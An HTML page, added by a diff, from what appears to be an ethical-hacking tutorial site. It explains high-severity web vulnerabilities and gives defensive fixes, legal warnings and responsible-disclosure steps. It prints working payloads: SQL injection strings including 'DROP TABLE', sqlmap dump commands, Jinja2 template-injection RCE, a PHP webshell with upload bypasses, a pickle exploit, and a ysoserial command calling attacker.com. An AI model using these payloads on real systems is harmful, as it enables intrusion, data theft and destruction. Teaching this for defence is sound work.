@@ -1,0 +1,414 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Level 3 — High/Critical Vulnerabilities | EthicalHack.dev</title>
+  <link rel="stylesheet" href="assets/css/style.css" />
+</head>
+<body>
+
+<nav class="navbar">
+  <div class="nav-inner">
+    <a href="index.html" class="nav-brand"><span class="brand-icon">&#x1F6E1;</span> EthicalHack<span class="brand-accent">.dev</span></a>
+    <div class="nav-links">
+      <a href="index.html" class="nav-link">Home</a>
+      <a href="level2.html" class="nav-link">Level 2</a>
+      <a href="level3.html" class="nav-link active">Level 3</a>
+      <a href="cbse-case.html" class="nav-link">CBSE Case</a>
+      <a href="cert-in.html" class="nav-link">CERT-In</a>
+      <a href="disclose.html" class="nav-link">Disclose</a>
+    </div>
+    <button class="hamburger" id="hamburger">&#9776;</button>
+  </div>
+</nav>
+
+<div class="container">
+  <div class="page-hero">
+    <span class="page-hero-badge tag-high">Level 3 &mdash; High / Critical &bull; CVSS 7.0–10.0</span>
+    <h1>High &amp; Critical Exploits</h1>
+    <p>SQL injection, remote code execution, authentication bypass, and real-world data breach discovery — the techniques that earn the biggest bug bounty payouts.</p>
+  </div>
+
+  <div class="info-box box-danger">
+    <span class="info-box-icon">&#128680;</span>
+    <span>These are the most dangerous vulnerability classes. All examples use <strong>isolated lab environments, deliberate CTF challenges, or public disclosures</strong>. Attempting these on live systems without authorization is a criminal offence under India IT Act 2000 &sect;66 (3 yr / &#8377;5L) and &sect;70 (10 yr for protected systems).</span>
+  </div>
+
+  <!-- SQL INJECTION -->
+  <div class="detail-panel" id="panel-sqli">
+    <div class="detail-panel-head">
+      <div>
+        <div class="detail-panel-title">&#128202; SQL Injection</div>
+        <div class="detail-panel-sub">CWE-89 &bull; In-band, Blind, Error-based, Time-based &bull; OWASP A03:2021</div>
+      </div>
+      <div style="display:flex;align-items:center;gap:10px">
+        <span class="sev-badge sev-high">High</span>
+        <span class="detail-panel-chev">&#8964;</span>
+      </div>
+    </div>
+    <div class="detail-panel-body">
+      <p class="text-sm text-muted" style="margin-bottom:14px">SQLi occurs when user input is concatenated directly into SQL queries. An attacker can dump entire databases, bypass authentication, or in some configurations achieve remote code execution via <code>xp_cmdshell</code> (MSSQL) or <code>INTO OUTFILE</code> (MySQL).</p>
+
+      <div class="tab-bar">
+        <button class="tab-btn active" data-group="sqli" data-tab="auth">Auth Bypass</button>
+        <button class="tab-btn" data-group="sqli" data-tab="union">UNION Dump</button>
+        <button class="tab-btn" data-group="sqli" data-tab="blind">Blind SQLi</button>
+        <button class="tab-btn" data-group="sqli" data-tab="fix">Defense</button>
+      </div>
+
+      <div class="tab-panel active" data-group="sqli" data-tab="auth">
+        <div class="slabel">Classic login bypass</div>
+        <div class="code-block"><span class="comment"># Login form with vulnerable backend:</span>
+Username: <span class="bad">admin'--</span>
+Password: (anything)
+
+<span class="comment"># Constructed query:</span>
+SELECT * FROM users
+WHERE username=<span class="bad">'admin'--'</span> AND password=<span class="string">'anything'</span>
+
+<span class="comment"># -- comments out the password check → logs in as admin
+# Variations:</span>
+<span class="bad">admin' OR '1'='1'--</span>      <span class="comment"># always true</span>
+<span class="bad">' OR 1=1--</span>              <span class="comment"># first user in table (often admin)</span>
+<span class="bad">'; DROP TABLE users;--</span>   <span class="comment"># destructive — never do in prod</span></div>
+      </div>
+
+      <div class="tab-panel" data-group="sqli" data-tab="union">
+        <div class="code-block"><span class="comment"># Step 1 — Find column count:</span>
+https://lab.target/item?id=1 ORDER BY 1-- <span class="good">✓</span>
+https://lab.target/item?id=1 ORDER BY 2-- <span class="good">✓</span>
+https://lab.target/item?id=1 ORDER BY 3-- <span class="bad">✗ error → 2 columns</span>
+
+<span class="comment"># Step 2 — UNION to extract DB version:</span>
+?id=<span class="bad">-1 UNION SELECT @@version,null--</span>
+
+<span class="comment"># Step 3 — List all tables:</span>
+?id=<span class="bad">-1 UNION SELECT table_name,null
+     FROM information_schema.tables
+     WHERE table_schema=database()--</span>
+
+<span class="comment"># Step 4 — Dump credentials:</span>
+?id=<span class="bad">-1 UNION SELECT username,password FROM users--</span></div>
+
+        <div class="code-block"><span class="comment"># Automate with sqlmap (authorized targets only):</span>
+sqlmap -u <span class="string">"https://lab.target/item?id=1"</span> \
+  --dbs --batch --level=3 --risk=2
+
+<span class="comment"># Dump specific table:</span>
+sqlmap -u <span class="string">"https://lab.target/item?id=1"</span> \
+  -D mydb -T users --dump --batch</div>
+      </div>
+
+      <div class="tab-panel" data-group="sqli" data-tab="blind">
+        <div class="code-block"><span class="comment"># No output visible — infer data from true/false responses:</span>
+
+<span class="comment"># Boolean-based:</span>
+?id=1 AND 1=1  <span class="good">→ page loads (true)</span>
+?id=1 AND 1=2  <span class="bad">→ blank/error (false)</span>
+
+<span class="comment"># Extract admin password one character at a time:</span>
+?id=1 AND SUBSTRING(
+  (SELECT password FROM users WHERE username='admin'),1,1
+)='a'  <span class="good">→ true? first char is 'a'</span>
+
+<span class="comment"># Time-based (no visible difference in response):</span>
+?id=1; IF(1=1, SLEEP(5), 0)--
+<span class="good">→ 5 second delay = condition is true</span>
+
+?id=1; IF(SUBSTRING(
+  (SELECT password FROM users LIMIT 1),1,1
+)='a', SLEEP(5), 0)--</div>
+      </div>
+
+      <div class="tab-panel" data-group="sqli" data-tab="fix">
+        <div class="info-box box-safe" style="margin-top:0">
+          <span class="info-box-icon">&#x2705;</span>
+          <div><strong>The only real fix:</strong> Parameterized queries / prepared statements. WAFs are defense-in-depth, not a replacement.</div>
+        </div>
+        <div class="code-block"><span class="comment">// WRONG — vulnerable concatenation:</span>
+<span class="bad">const q = "SELECT * FROM users WHERE id=" + req.params.id;</span>
+
+<span class="comment">// RIGHT — parameterized (Node.js + mysql2):</span>
+<span class="good">const [rows] = await db.execute(
+  "SELECT * FROM users WHERE id = ?",
+  [req.params.id]
+);</span>
+
+<span class="comment">// Python + psycopg2:</span>
+<span class="good">cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))</span>
+
+<span class="comment">// Java PreparedStatement:</span>
+<span class="good">PreparedStatement ps = conn.prepareStatement(
+  "SELECT * FROM users WHERE id = ?"
+);
+ps.setInt(1, userId);</span></div>
+      </div>
+
+      <div class="slabel" style="margin-top:16px">Impact</div>
+      <div class="impact-row"><span class="impact-label">Confidentiality</span><div class="impact-track"><div class="impact-fill" style="width:95%;background:var(--red)"></div></div></div>
+      <div class="impact-row"><span class="impact-label">Integrity</span><div class="impact-track"><div class="impact-fill" style="width:90%;background:var(--red)"></div></div></div>
+      <div class="impact-row"><span class="impact-label">Availability</span><div class="impact-track"><div class="impact-fill" style="width:75%;background:var(--orange)"></div></div></div>
+    </div>
+  </div>
+
+  <!-- RCE -->
+  <div class="detail-panel" id="panel-rce">
+    <div class="detail-panel-head">
+      <div>
+        <div class="detail-panel-title">&#128187; Remote Code Execution (RCE)</div>
+        <div class="detail-panel-sub">CWE-94 &bull; SSTI, File Upload, Deserialization &bull; CVSS up to 10.0</div>
+      </div>
+      <div style="display:flex;align-items:center;gap:10px">
+        <span class="sev-badge sev-critical">Critical</span>
+        <span class="detail-panel-chev">&#8964;</span>
+      </div>
+    </div>
+    <div class="detail-panel-body">
+      <p class="text-sm text-muted" style="margin-bottom:14px">RCE is the worst class of vulnerability — full control of the target server with no physical access required. A single RCE on a cloud server can expose every customer's data.</p>
+
+      <div class="tab-bar">
+        <button class="tab-btn active" data-group="rce" data-tab="ssti">SSTI</button>
+        <button class="tab-btn" data-group="rce" data-tab="upload">File Upload</button>
+        <button class="tab-btn" data-group="rce" data-tab="deser">Deserialization</button>
+        <button class="tab-btn" data-group="rce" data-tab="fix">Defense</button>
+      </div>
+
+      <div class="tab-panel active" data-group="rce" data-tab="ssti">
+        <div class="slabel">Server-Side Template Injection — Jinja2 (Python/Flask)</div>
+        <div class="code-block"><span class="comment"># Step 1 — Detect SSTI (safe math test):</span>
+Input: <span class="bad">{{7*7}}</span>
+Output: <span class="good">49</span>  <span class="comment">← template evaluated our expression = SSTI confirmed</span>
+
+<span class="comment"># Step 2 — Identify engine (Jinja2 vs Twig vs Freemarker):</span>
+{{7*'7'}}   <span class="good">→ '7777777'</span> <span class="comment">= Jinja2 / Twig</span>
+${7*7}      <span class="good">→ 49</span>        <span class="comment">= Freemarker / Velocity</span>
+
+<span class="comment"># Step 3 — Full RCE on Jinja2 (lab environment only):</span>
+<span class="bad">{{config.__class__.__init__.__globals__['os']
+  .popen('id').read()}}</span>
+<span class="good">→ uid=33(www-data) gid=33(www-data)</span>
+
+<span class="comment"># Shorter payload:</span>
+<span class="bad">{{''.__class__.mro()[1].__subclasses__()[396]
+  ('id',shell=True,stdout=-1).communicate()[0]}}</span></div>
+      </div>
+
+      <div class="tab-panel" data-group="rce" data-tab="upload">
+        <div class="code-block"><span class="comment"># File upload bypass — get a webshell onto server:</span>
+
+<span class="comment"># Basic PHP webshell payload (shell.php):</span>
+<span class="bad">&lt;?php system($_GET['cmd']); ?&gt;</span>
+
+<span class="comment"># Bypass extension filter — null byte trick:</span>
+Filename: <span class="bad">shell.php%00.jpg</span>   <span class="comment">← old PHP &lt;5.3</span>
+
+<span class="comment"># Bypass MIME-type check — spoof Content-Type:</span>
+Content-Type: <span class="bad">image/jpeg</span>    <span class="comment">← server checks this, not actual content</span>
+
+<span class="comment"># Double extension bypass:</span>
+Filename: <span class="bad">shell.php.jpg</span>       <span class="comment">← some servers execute .php regardless</span>
+
+<span class="comment"># Magic bytes bypass — prepend JPEG header:</span>
+<span class="bad">FF D8 FF E0</span> &lt;?php system($_GET['cmd']); ?&gt;
+
+<span class="comment"># After successful upload, trigger execution:</span>
+https://lab.target/uploads/shell.php?cmd=whoami</div>
+      </div>
+
+      <div class="tab-panel" data-group="rce" data-tab="deser">
+        <div class="code-block"><span class="comment"># Java deserialization — ysoserial gadget chains (lab only):</span>
+
+<span class="comment"># Generate malicious serialized payload:</span>
+java -jar ysoserial.jar CommonsCollections6 \
+  <span class="string">'curl https://attacker.com/pwned'</span> | base64
+
+<span class="comment"># Send as cookie or POST body where server deserializes Java objects</span>
+
+<span class="comment"># PHP object injection:</span>
+<span class="bad">O:8:"UserPref":1:{s:4:"theme";s:19:"../../../etc/passwd"}</span>
+<span class="comment"># If class has __toString or __wakeup with file read → path traversal / RCE</span>
+
+<span class="comment"># Python pickle (never unpickle untrusted data):</span>
+<span class="keyword">import</span> pickle, os
+<span class="keyword">class</span> Exploit(object):
+    <span class="keyword">def</span> __reduce__(self):
+        <span class="keyword">return</span> os.system, (<span class="string">'id'</span>,)
+pickle.dumps(Exploit())  <span class="comment"># → sends this → server executes 'id'</span></div>
+      </div>
+
+      <div class="tab-panel" data-group="rce" data-tab="fix">
+        <div class="code-block"><span class="comment"># SSTI fix — never pass user input directly to render():</span>
+<span class="bad">return render_template_string(user_input)     # WRONG</span>
+<span class="good">return render_template('page.html', name=user_input)  # RIGHT</span>
+
+<span class="comment"># File upload fix — validate by magic bytes, not extension:</span>
+<span class="good">import magic
+mime = magic.from_buffer(file.read(1024), mime=True)
+ALLOWED = {'image/jpeg', 'image/png', 'image/gif'}
+if mime not in ALLOWED:
+    abort(400)</span>
+
+<span class="comment"># Store uploads outside webroot so they can't be executed:</span>
+<span class="good">UPLOAD_DIR = '/var/uploads/'  # not inside /var/www/html/</span>
+
+<span class="comment"># Deserialization fix — replace with safe format:</span>
+<span class="bad">obj = pickle.loads(data)          # WRONG</span>
+<span class="good">obj = json.loads(data)            # RIGHT — JSON has no code execution</span></div>
+      </div>
+
+      <div class="slabel" style="margin-top:16px">Impact — always CVSS 9.8–10.0</div>
+      <div class="impact-row"><span class="impact-label">Confidentiality</span><div class="impact-track"><div class="impact-fill" style="width:100%;background:var(--red)"></div></div></div>
+      <div class="impact-row"><span class="impact-label">Integrity</span><div class="impact-track"><div class="impact-fill" style="width:100%;background:var(--red)"></div></div></div>
+      <div class="impact-row"><span class="impact-label">Availability</span><div class="impact-track"><div class="impact-fill" style="width:100%;background:var(--red)"></div></div></div>
+    </div>
+  </div>
+
+  <!-- AUTH BYPASS -->
+  <div class="detail-panel" id="panel-bypass">
+    <div class="detail-panel-head">
+      <div>
+        <div class="detail-panel-title">&#128274; Authentication Bypass on Major Platforms</div>
+        <div class="detail-panel-sub">Logic flaws, race conditions, OAuth misconfigurations &bull; Real bounty payouts $25k–$133k</div>
+      </div>
+      <div style="display:flex;align-items:center;gap:10px">
+        <span class="sev-badge sev-critical">Critical</span>
+        <span class="detail-panel-chev">&#8964;</span>
+      </div>
+    </div>
+    <div class="detail-panel-body">
+
+      <div class="tab-bar">
+        <button class="tab-btn active" data-group="bypass" data-tab="jwt">JWT alg:none</button>
+        <button class="tab-btn" data-group="bypass" data-tab="2fa">2FA Bypass</button>
+        <button class="tab-btn" data-group="bypass" data-tab="oauth">OAuth Flaw</button>
+        <button class="tab-btn" data-group="bypass" data-tab="bounty">Real Bounties</button>
+      </div>
+
+      <div class="tab-panel active" data-group="bypass" data-tab="jwt">
+        <div class="code-block"><span class="comment"># JWT "alg:none" — documented CVE-2015-9235 / CVE-2016-10555:</span>
+
+<span class="comment"># 1. Decode your JWT (base64url decode each part):</span>
+Header:  { "alg": "HS256", "typ": "JWT" }
+Payload: { "user": "alice", "role": "user", "exp": 1719999999 }
+
+<span class="comment"># 2. Modify header and payload:</span>
+Header:  { <span class="bad">"alg": "none"</span>, "typ": "JWT" }
+Payload: { "user": "alice", <span class="bad">"role": "admin"</span>, "exp": 9999999999 }
+
+<span class="comment"># 3. Re-encode without signature:</span>
+eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.MODIFIED_PAYLOAD.
+
+<span class="comment"># 4. Vulnerable library accepts this → you are now admin</span>
+
+<span class="comment"># Fix — always verify explicitly:</span>
+<span class="good">jwt.verify(token, secret, { algorithms: ['HS256'] })</span></div>
+      </div>
+
+      <div class="tab-panel" data-group="bypass" data-tab="2fa">
+        <div class="code-block"><span class="comment"># 2FA bypass via response manipulation (Burp Suite):</span>
+
+<span class="comment"># Normal failed OTP response:</span>
+HTTP 200 OK
+{ <span class="bad">"success": false, "message": "Invalid OTP"</span> }
+
+<span class="comment"># Intercept → change to:</span>
+{ <span class="good">"success": true</span>, "redirect": "/dashboard" }
+
+<span class="comment"># App trusts client response → 2FA bypassed
+# Fix: ALL auth decisions must happen server-side only</span>
+
+<span class="comment"># 2FA bypass via backup code brute-force (if no rate limit):</span>
+<span class="comment"># Backup codes are often 8 digits = 100,000,000 combinations
+# With no lockout, can brute-force in automated fashion</span></div>
+      </div>
+
+      <div class="tab-panel" data-group="bypass" data-tab="oauth">
+        <div class="code-block"><span class="comment"># OAuth state parameter missing → CSRF account takeover:</span>
+
+<span class="comment"># Legitimate OAuth flow:</span>
+/oauth/authorize?client_id=APP&redirect_uri=...&<span class="bad">state=CSRF_TOKEN</span>
+
+<span class="comment"># If state is not validated:</span>
+<span class="comment"># 1. Attacker starts OAuth flow, intercepts auth code</span>
+<span class="comment"># 2. Tricks victim into completing attacker's flow</span>
+<span class="comment"># 3. Auth code is bound to attacker's state → account linked to attacker</span>
+
+<span class="comment"># OAuth redirect_uri bypass:</span>
+redirect_uri=https://legit.com/../attacker.com  <span class="comment"># path traversal</span>
+redirect_uri=https://legit.com.attacker.com     <span class="comment"># subdomain</span>
+redirect_uri=https://attacker.com?x=legit.com  <span class="comment"># parameter pollution</span></div>
+      </div>
+
+      <div class="tab-panel" data-group="bypass" data-tab="bounty">
+        <table class="data-table">
+          <thead><tr><th>Platform</th><th>Vulnerability</th><th>Bounty</th><th>Year</th></tr></thead>
+          <tbody>
+            <tr><td>Facebook</td><td>2FA bypass via OAuth flow — set new password on any account without OTP</td><td style="color:var(--green)">$133,000</td><td>2022</td></tr>
+            <tr><td>Apple</td><td>Auth bypass via Sign in with Apple — full account takeover of any third-party app using Apple login</td><td style="color:var(--green)">$100,000</td><td>2020</td></tr>
+            <tr><td>HackerOne</td><td>IDOR + auth bypass exposing private bug reports</td><td style="color:var(--green)">$20,000</td><td>2019</td></tr>
+            <tr><td>Shopify</td><td>Stored XSS + IDOR combination → admin panel access</td><td style="color:var(--green)">$25,000</td><td>2021</td></tr>
+            <tr><td>CBSE (India)</td><td>5 critical flaws — master password, client-side OTP, AWS bucket, SQLi, no old-pw check</td><td style="color:var(--accent2)">IIT Kanpur offer</td><td>2024–25</td></tr>
+          </tbody>
+        </table>
+      </div>
+    </div>
+  </div>
+
+  <!-- DATA BREACH -->
+  <div class="detail-panel" id="panel-breach">
+    <div class="detail-panel-head">
+      <div>
+        <div class="detail-panel-title">&#128202; Data Breach Discovery</div>
+        <div class="detail-panel-sub">Finding &amp; responsibly disclosing large-scale exposures &bull; CBSE case study preview</div>
+      </div>
+      <div style="display:flex;align-items:center;gap:10px">
+        <span class="sev-badge sev-critical">Critical</span>
+        <span class="detail-panel-chev">&#8964;</span>
+      </div>
+    </div>
+    <div class="detail-panel-body">
+      <p class="text-sm text-muted" style="margin-bottom:14px">Discovering that a live system has exposed millions of records is a critical moment. What you do in the next 60 minutes determines whether you become a criminal or a hero.</p>
+
+      <div class="step-list">
+        <div class="step-item">
+          <div class="step-line"><div class="step-dot" style="background:var(--red);color:#fff">1</div><div class="step-vline"></div></div>
+          <div class="step-content"><div class="step-title">Stop immediately — document minimally</div><div class="step-desc">Take 1–2 screenshots proving the vulnerability. Do NOT download bulk data, do NOT access more than necessary to prove the flaw exists.</div></div>
+        </div>
+        <div class="step-item">
+          <div class="step-line"><div class="step-dot" style="background:var(--orange);color:#fff">2</div><div class="step-vline"></div></div>
+          <div class="step-content"><div class="step-title">Write a clear, professional report</div><div class="step-desc">URL/endpoint, steps to reproduce, one proof screenshot, severity, and your recommended fix. No demands, no threats.</div></div>
+        </div>
+        <div class="step-item">
+          <div class="step-line"><div class="step-dot" style="background:var(--accent);color:#fff">3</div><div class="step-vline"></div></div>
+          <div class="step-content"><div class="step-title">Report to CERT-In + organization</div><div class="step-desc">Email: incident@cert-in.org.in for any Indian government system. For private companies, find security.txt or their bug bounty program.</div></div>
+        </div>
+        <div class="step-item">
+          <div class="step-line"><div class="step-dot" style="background:var(--green);color:#000">4</div></div>
+          <div class="step-content"><div class="step-title">Wait 90 days — then consider disclosure</div><div class="step-desc">Industry standard is 90 days for the org to patch before you go public. For Indian government targets, consult a lawyer before any public disclosure.</div></div>
+        </div>
+      </div>
+
+      <div class="info-box box-info mt12">
+        <span class="info-box-icon">&#128214;</span>
+        <span>The CBSE student case is the perfect example of this done right. <a href="cbse-case.html" style="color:var(--blue)">Read the full case study &rarr;</a></span>
+      </div>
+    </div>
+  </div>
+
+</div>
+
+<footer class="footer">
+  <div class="container footer-inner">
+    <div class="footer-brand">&#x1F6E1; EthicalHack.dev</div>
+    <div class="footer-links">
+      <a href="cbse-case.html">CBSE Case Study &rarr;</a>
+      <a href="disclose.html">Responsible Disclosure</a>
+    </div>
+    <div class="footer-note">Educational use only. Always obtain written authorization before testing any system.</div>
+  </div>
+</footer>
+
+<script src="assets/js/nav.js"></script>
+</body>
+</html>
